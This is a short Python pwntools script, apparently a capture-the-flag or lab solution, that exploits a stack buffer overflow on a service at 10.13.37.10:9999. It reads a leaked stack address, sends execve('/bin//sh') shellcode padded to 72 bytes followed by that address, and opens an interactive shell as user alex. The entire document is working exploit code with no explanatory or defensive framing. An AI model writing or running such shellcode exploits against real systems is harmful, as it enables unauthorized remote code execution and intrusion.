#!/usr/bin/python3
from pwn import *

shell = remote('10.13.37.10', 9999)
shell.recvuntil(b"Oops, I'm leaking! ")

leaking = int(shell.recvuntil(b"\n"),16)

payload = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"
payload += b"A"*(72-len(payload))
payload += p64(leaking)

shell.recvuntil(b"> ")
shell.sendline(payload)
shell.sendline(b"export HOME=/home/alex TERM=xterm; cd")
shell.interactive()
